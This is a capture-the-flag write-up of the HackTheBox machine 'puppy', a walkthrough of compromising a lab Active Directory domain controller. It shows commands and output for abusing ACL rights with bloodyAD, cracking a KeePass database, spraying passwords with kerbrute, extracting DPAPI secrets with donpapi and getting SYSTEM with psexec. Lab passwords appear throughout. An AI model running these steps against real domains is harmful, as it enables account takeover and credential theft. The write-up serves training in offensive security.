---
title: HackTheBox - puppy writeup (Windows/Medium)
categories: [HackTheBox]
tags: [HackTheBox, Linux, AD, nmap, nxc, smb, GenericWrite, keepass, keepass2john, kerbrute, GenericAll, bloodyAD, evil-winrm, dpapi, donpapi, psexec]
render_with_liquid: false
---

`puppy` is an assume-breach medium windows box  where you're given the credentials of `levi.james`, I started with exploiting a `GenericWrite` to add my user to the `DEVELOPERS` groups and gain access to the `DEV` share, where I found and cracked an encrypted `keepass` database that had another user's credentials, from there I used a `genericAll` to enable a disabled user, change his password and log in to grab the user flag. As for the privilege escalation, I found a backup laying around in the filesystem that had another user password, then I extracted DPAPI secrets to gain access to a local admin and get the root flag

## Recon

I ran `nmap` to find that the machine is domain controller running active directory services

```bash
$ nmap -sSCV -sS -oA puppy 10.10.11.70
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-24 21:08 +0100
Nmap scan report for 10.10.11.70
Bug in iscsi-info: no string output.
Host is up (0.15s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-25 21:10:38Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1d01h01m35s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-09-25T21:12:34
|_  start_date: N/A
```

I used `nxc` to generate the hosts file for me

```bash
$ nxc smb 10.10.11.70 --generate-hosts-file /etc/hosts
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
```

which generates the following line

```bash
10.10.11.70     DC.PUPPY.HTB PUPPY.HTB DC
```

I enumerated the shares, and found a `DEV` share, but it wasn't readable by `levi.james`

```bash
$ nxc smb puppy.htb -u levi.james -p KingofAkron2025! --shares
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.10.11.70     445    DC               [-] Account not found in the BloodHound database.
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```
## ant.edwards

I used bloodhound for further enumeration inside the AD environment, and found that `levi.james` is a member of the `HR` group which has `GenericWrite` on `DEVELOPERS` group

```bash
$ bloodhound-python -ns 10.10.11.70 -d puppy.htb -u levi.james -p 'KingofAkron2025!' --zip -c ALL
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 47S
INFO: Compressing output into 20250922205505_bloodhound.zip
```

![HR_group_GenericWrite_on_DEVS_group.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/puppy/HR_group_GenericWrite_on_DEVS_group.png)

we can use it to add `levi.james` to the `DEVELOPERS` group

```bash
$ bloodyAD --host 10.10.11.70 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember "DEVELOPERS" "levi.james"
[+] levi.james added to DEVELOPERS
```

now if we check the shares again we find that we have `READ` permissions on the `DEV` share

```bash
$ nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.10.11.70     445    DC               [-] Provided Neo4J credentials (admin:) are not valid.
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
```

inside the share we find an encrypted Keepass database

``` bash
$ smbclient //puppy.htb/dev -U levi.james%'KingofAkron2025!'
Can''t load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 07:07:57 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025

		5080575 blocks of size 4096. 1625222 blocks available
smb: \> get recovery.kdbx
getting file \recovery.kdbx of size 2677 as recovery.kdbx (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
```

I tried getting a john-compatible hash from the file using `keepass2john` script but to my surprise that didn't work for me at first, even tho I had a latest `john 1.9.0.jumbo1-11` from the arch linux archives

```bash
$ keepass2john recovery.kdbx
! recovery.kdbx : File version '40000' is currently not supported!
```

so I compiled the latest commit from the github repo and extracted the hash and cracked it

```bash
$ ./john/keepass2john recovery.kdbx > hash
$ ./john/run/john hash --wordlist=rockyou.txt
KeePass-opencl: Argon2 hash(es) not supported, skipping.
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-Argon2-opencl"
Use the "--format=KeePass-Argon2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 37 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 4 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that''s fine)
liverpool        (recovery)
1g 0:00:00:12 DONE (2025-09-22 14:24) 0.07770g/s 3.108p/s 3.108c/s 3.108C/s purple..123123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I opened the keepass database using the recovered password and found few credentials inside

![keepass_database.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/puppy/keepass_database.png)

I tried getting all users using `nxc --users` and spraying those passwords against all of them using `kerbrute` hoping for password reuse, but only one combination worked

```bash
$ nxc smb puppy.htb -u levi.james -p KingofAkron2025! --users
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
SMB         10.10.11.70     445    DC               [-] Provided Neo4J credentials (admin:) are not valid.
SMB         10.10.11.70     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.70     445    DC               Administrator                 2025-02-19 19:33:28 3       Built-in account for administering the computer/domain
SMB         10.10.11.70     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.70     445    DC               krbtgt                        2025-02-19 11:46:15 0       Key Distribution Center Service Account
SMB         10.10.11.70     445    DC               levi.james                    2025-02-19 12:10:56 0
SMB         10.10.11.70     445    DC               ant.edwards                   2025-02-19 12:13:14 3
SMB         10.10.11.70     445    DC               adam.silver                   2025-09-25 21:34:29 1
SMB         10.10.11.70     445    DC               jamie.williams                2025-02-19 12:17:26 4
SMB         10.10.11.70     445    DC               steph.cooper                  2025-02-19 12:21:00 3
SMB         10.10.11.70     445    DC               steph.cooper_adm              2025-03-08 15:50:40 3
SMB         10.10.11.70     445    DC               [*] Enumerated 9 local users: PUPPY
```


```bash
$ for user in $(cat users); do for pass in $(cat passwords); do echo $user:$pass; done; done  > wordlist
$ kerbrute bruteforce --dc dc.puppy.htb -d puppy.htb wordlist

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 09/25/25 - Ronnie Flathers @ropnop

2025/09/25 22:46:31 >  Using KDC(s):
2025/09/25 22:46:31 >  	dc.puppy.htb:88

2025/09/25 22:46:32 >  [+] VALID LOGIN:	 ant.edwards@puppy.htb:Antman2025!
2025/09/25 22:46:33 >  Done! Tested 36 logins (1 successes) in 1.531 seconds
```

## adam.silver

back to bloodhound we see that `ant.edwards` is a member of the `SENIOR DEVS` group which has `genericAll` on `adam.silver`

![senior_devs_group_genericAll_on_adam_silver.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/puppy/senior_devs_group_genericAll_on_adam_silver.png)

we can use it to change `adam.silver`'s password

```bash
$ bloodyAD --host "10.10.11.70" -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password adam.silver 'AtHxkTLqW6e9'
[+] Password changed successfully!
```

when I tried longing in as `adam.silver` I found that the account was disabled 

```bash
$ nxc smb puppy.htb -u adam.silver -p AtHxkTLqW6e9
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:AtHxkTLqW6e9 STATUS_ACCOUNT_DISABLED
```

but since I have `genericAll` on that user I just went ahead and enabled it

```bash
$ bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```
and now signing in works

```bash
$ nxc ldap puppy.htb -u adam.silver -p AtHxkTLqW6e9
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB) (signing:None) (channel binding:No TLS cert)
LDAP        10.10.11.70     389    DC               [+] PUPPY.HTB\adam.silver:AtHxkTLqW6e9
```

and since `adam.silver` is a member of `REMOTE MANAGEMENT USERS` group, I can just use `evil-winrm` and get the flag

```bash
$ evil-winrm -i 10.10.11.70 -u adam.silver -p AtHxkTLqW6e9
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
/home/jeff/.gem/ruby/3.4.0/gems/rexml-3.4.2/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> ls


    Directory: C:\Users\adam.silver\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---         9/26/2025   6:11 PM             34 user.txt


*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
a6****************************d8
*Evil-WinRM* PS C:\Users\adam.silver\Desktop>
```

## steph.cooper

after logging in, I looked around in the file system and found a `Backups` directories under `C:\` with an interesting zip file inside

```bash
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ../../../
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         7/24/2025  12:25 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---          3/8/2025   8:52 AM                Users
d-----         5/13/2025   4:40 PM                Windows


*Evil-WinRM* PS C:\> ls Backups


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


Evil-WinRM* PS C:\> download Backups/site-backup-2024-12-30.zip
Info: Download successful!
*Evil-WinRM* PS C:\>
```

inside the zip file I found another file `ded` which had `steph.cooper`'s password inside, which was another member of the `REMOTE MANAGEMENT USERS` group

```bash
$ unzip site-backup-2024-12-30.zip
$ ls puppy/
assets  images  index.html  nms-auth-config.xml.bak
$ cat puppy/nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

## steph.cooper_adm

I got a shell as steph.cooper and found some encrypted credentials in `windows Credential Manager`, we can see a hidden credentials encrypted blob
```bash
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> cd \Users\steph.cooper\appData\Roaming\Microsoft\Credentials
*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Credentials> ls
Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Credentials> gci -force


    Directory: C:\Users\steph.cooper\appData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9


*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Credentials>

```

 we also find the master key to decrypt that blob
``` bash
*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Credentials> cd ../Protect
*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Protect> ls


    Directory: C:\Users\steph.cooper\appData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107


*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Protect> cd S-1-5-21-1487982659-1829050783-2281216199-1107
*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls
*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> gci -force


    Directory: C:\Users\steph.cooper\appData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred


*Evil-WinRM* PS C:\Users\steph.cooper\appData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107>
```

then I used `donpapi` from my linux machine to remotely decrypt and extract those credentials

```bash
$ donpapi collect -t dc.puppy.htb -d puppy.htb -u steph.cooper -p 'ChefSteph2025!'
[💀] [+] DonPAPI Version 2.1.0
[💀] [+] Output directory at /home/jeff/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/jeff/.donpapi/recover/recover_1758839035
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

$ cat /home/jeff/.donpapi/recover/recover_1758839035 | jq
{
  "v": 0,
  "output_directory": null,
  "action": "collect",
  "keep_collecting": null,
  "threads": 50,
  "no_config": false,
  "target": [
    "dc.puppy.htb"
  ],
  "domain": "puppy.htb",
  "username": "steph.cooper",
  "password": "ChefSteph2025!",
  "hashes": null,
  "no_pass": false,
  "k": false,
  "aesKey": null,
  "laps": false,
  "dc_ip": null,
  "recover_file": null,
  "collectors": "All",
  "no_remoteops": false,
  "fetch_pvk": false,
  "pvkfile": null,
  "pwdfile": null,
  "ntfile": null,
  "mkfile": null,
  "lmhash": "",
  "nthash": ""
}
```

looking back to bloodhound, we can see that `steph.cooper_adm` is a local administrator on the machine

![steph_cooper_adm.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/puppy/steph_cooper_adm.png)

so I got a remote shell using `psexec` and got the root flag

``` bash
$ psexec.py puppy.htb/steph.cooper_adm:'FivethChipOnItsWay2025!'@puppy.htb

[*] Requesting shares on puppy.htb.....
[*] Found writable share ADMIN$
[*] Uploading file ywsUEMsm.exe
[*] Opening SVCManager on puppy.htb.....
[*] Creating service pSTT on puppy.htb.....
[*] Starting service pSTT.....
 ^[[C[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd ../../Users\Administrator\Desktop

dC:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 311D-593C

 Directory of C:\Users\Administrator\Desktop

05/12/2025  07:34 PM    <DIR>          .
03/11/2025  09:14 PM    <DIR>          ..
09/26/2025  10:09 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,631,047,168 bytes free

tC:\Users\Administrator\Desktop>type root.txt
a0****************************44

C:\Users\Administrator\Desktop>
```
